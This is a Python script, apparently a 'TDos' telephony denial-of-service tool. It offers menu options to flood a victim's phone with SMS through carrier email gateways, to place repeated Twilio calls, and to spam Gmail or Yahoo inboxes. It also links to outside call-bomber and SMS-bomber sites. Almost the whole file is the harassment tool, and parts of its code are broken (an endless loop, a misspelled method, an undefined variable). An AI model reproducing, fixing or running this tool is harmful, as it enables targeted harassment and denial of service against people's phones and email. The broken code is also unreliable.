import pip
pip.main(['install', 'colorama'])
pip.main(['install', 'twilio'])

from colorama import init, Fore, Back, Style
from twilio.rest import Client
import smtplib

init()


#----color----
def cprint(msg, foreground = "black", background = "white"):
    fground = foreground.upper()
    bground = background.upper()
    style = getattr(Fore, fground) + getattr(Back, bground)
    print(style + msg + Style.RESET_ALL)
#----/color----


#----banner----
cprint("""                                   
XX   MMMMMMMMMMMMMMMMss'''                          '''ssMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMyy''                                    ''yyMMMMMMMMMMMM   XX
XX   MMMMMMMMyy''                                            ''yyMMMMMMMM   XX
XX   MMMMMy''                                                    ''yMMMMM   XX
XX   MMMy'                                                          'yMMM   XX
XX   Mh'                                                              'hM   XX
XX   -                                                                  -   XX
XX                                                                          XX
XX   ::                                                                ::   XX
XX   MMhh.        ..hhhhhh..                      ..hhhhhh..        .hhMM   XX
XX   MMMMMh   ..hhMMMMMMMMMMhh.                .hhMMMMMMMMMMhh..   hMMMMM   XX
XX   ---MMM .hMMMMdd:::dMMMMMMMhh..        ..hhMMMMMMMd:::ddMMMMh. MMM---   XX
XX   MMMMMM MMmm''      'mmMMMMMMMMyy.  .yyMMMMMMMMmm'      ''mmMM MMMMMM   XX
XX   ---mMM ''             'mmMMMMMMMM  MMMMMMMMmm'             '' MMm---   XX
XX   yyyym'    .              'mMMMMm'  'mMMMMm'              .    'myyyy   XX
XX   mm''    .y'     ..yyyyy..  ''''      ''''  ..yyyyy..     'y.    ''mm   XX
XX           MN    .sMMMMMMMMMss.   .    .   .ssMMMMMMMMMs.    NM           XX
XX           N`    MMMMMMMMMMMMMN   M    M   NMMMMMMMMMMMMM    `N           XX
XX            +  .sMNNNNNMMMMMN+   `N    N`   +NMMMMMNNNNNMs.  +            XX
XX              o+++     ++++Mo    M      M    oM++++     +++o              XX
XX                                oo      oo                                XX
XX           oM                 oo          oo                 Mo           XX
XX         oMMo                M              M                oMMo         XX
XX       +MMMM                 s              s                 MMMM+       XX
XX      +MMMMM+            +++NNNN+        +NNNN+++            +MMMMM+      XX
XX     +MMMMMMM+       ++NNMMMMMMMMN+    +NMMMMMMMMNN++       +MMMMMMM+     XX
XX     MMMMMMMMMNN+++NNMMMMMMMMMMMMMMNNNNMMMMMMMMMMMMMMNN+++NNMMMMMMMMM     XX
XX     yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy     XX
XX   m  yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy  m   XX
XX   MMm yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy mMM   XX
XX   MMMm .yyMMMMMMMMMMMMMMMM     MMMMMMMMMM     MMMMMMMMMMMMMMMMyy. mMMM   XX
XX   MMMMd   ''''hhhhh       odddo          obbbo        hhhh''''   dMMMM   XX
XX   MMMMMd             'hMMMMMMMMMMddddddMMMMMMMMMMh'             dMMMMM   XX
XX   MMMMMMd              'hMMMMMMMMMMMMMMMMMMMMMMh'              dMMMMMM   XX
XX   MMMMMMM-               ''ddMMMMMMMMMMMMMMdd''               -MMMMMMM   XX
XX   MMMMMMMM                   '::dddddddd::'                   MMMMMMMM   XX
XX   MMMMMMMM-                                                  -MMMMMMMM   XX
XX   MMMMMMMMM                                                  MMMMMMMMM   XX
XX   MMMMMMMMMy                                                yMMMMMMMMM   XX
XX   MMMMMMMMMMy.                                            .yMMMMMMMMMM   XX
XX   MMMMMMMMMMMMy.                                        .yMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMy.                                    .yMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMs.                                .sMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMss.           ....           .ssMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMMMNo         oNNNNo         oNMMMMMMMMMMMMMMMMMMMM   XX\n
""", 'white', 'black')
                                                                                                                             
#----/banner----

cprint("""
            ++++++++++++++++++++++++++++++++++++++++++++++++
            +   A) SMS-flooding         B) Call-flooding   +
            +                                              +
            +   C) Gmail-flooding       D) Yahoo-flooding  +
            +                                              +
            ++++++++++++++++++++++++++++++++++++++++++++++++

""", 'red', 'black')

cprint("""
\n\nLinks:
Call-flood: http://callbomber.com/
SMS-flood:  http://www.tricksbreaker.tk/2017/01/new-working-online-sms-bomber-script_22.html
	""", 'green', 'black')





def spamemail(server):
    mail = raw_input('Email: ')
    passwd = raw_input('Password: ')
    to = raw_input('To: ')
    body = raw_input('Message: ')
    num = raw_input('Number of send: ')
    server = smtplib.SMTP(server)
    server.starttls()
    server.login(mail,passwd)
    i = 1
    while 1 <= num:
        i = i + 1
        server.sendmai(mail,to,body)
    server.quit()


def smsbomb():
	cprint("""
		Verizon            - @vtext.com
		Alltell            - @text.wireless.alltel.com
		AT&T               - @txt.att.net
		Boost Mobile       - @boostmobile.com
		Cellular One       - @mobile.celloneusa.com
		Cingular           - @cingular.com
		T-Mobile(USA       - @tmomail.net
		TSprint(Nextel)    - @page.nextel.com
		MetroPCS           - @mymetropcs.com
		Nextel             - @messaging.nextel.com
		Telus Mobility     - @msg.telus.com
		Virgin Mobile(USA) - @bills.com

        Depending on your country, you can specify your provider
		""", 'white', 'black')


	provider = raw_input('Your providers: ')
	num      = raw_input('Victim number: ') + provider
	gmail    = raw_input('Gmail: ')
	passw    = raw_input('Password: ')
	message  = raw_input('Message: ')
	count    = raw_input('Counter: ')
	smtp = smtplib.SMTP("smtp.gmail.com:587")
	smtp.starttls()
	smtp.login(gmail, password)
	spam = "From: {} \r\nTo: {} \r\n\r\n {}".format(gmail, num, message)
	for i in range(count):
		smtp.sendmail(gmail, num, spam)


def callflood():
	account_sid = raw_input("Account sid: ")
	auth_token  = raw_input("Auth token: ")
	client      = Client(account_sid, auth_token)
	to          = raw_input('Number to: ')
	fromnum     = raw_input('From number: ')
	count       = raw_input('Count: ')

	for i in range(count):
		call = client.calls.create(
			to=to,
			from_=fromnum,
			url="http://demo.twilio.com/docs/voice.xml"
			)
	print(call.sid)




case = ' '

while case != '':
	case = raw_input('TDos >>> ')

	if (case == '1' or case == 'A'):
		smsbomb()
	elif(case == '2' or case == 'B'):
		callflood()		
	elif(case == '3' or case == 'C'):
		spamemail('smtp.gmail.com:587')
	elif(case == '4' or case == 'D'):
		spamemail('smtp.mail.yahoo.com:25')
